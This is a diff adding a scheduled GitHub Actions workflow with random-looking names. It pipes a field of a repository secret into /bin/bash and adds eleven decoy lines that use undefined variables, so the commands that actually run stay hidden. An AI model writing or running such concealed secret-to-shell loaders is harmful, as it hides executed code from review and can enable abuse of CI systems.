@@ -1,0 +1,28 @@
+name: zhebanglfbh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhebanglfbh
+        env:
+          mfc93984: ${{ secrets.mfc93984 }}
+        run: |
+          echo $mfc93984 | jq -r .loep2 | /bin/bash
+          echo $qgk7339 | jq -r .lhmw707 | /bin/bash
+          echo $k7017 | jq -r .shcgf456 | /bin/bash
+          echo $u3 | jq -r .qriv23904 | /bin/bash
+          echo $hcpqo74 | jq -r .ho12 | /bin/bash
+          echo $v613 | jq -r .kat4 | /bin/bash
+          echo $wncec81 | jq -r .py04 | /bin/bash
+          echo $krk72 | jq -r .yxnzq5726 | /bin/bash
+          echo $lm437 | jq -r .chtn235 | /bin/bash
+          echo $fc45536 | jq -r .wqqo76 | /bin/bash
+          echo $gmyt904 | jq -r .zya7 | /bin/bash
+          echo $dml1 | jq -r .fk6002 | /bin/bash
+
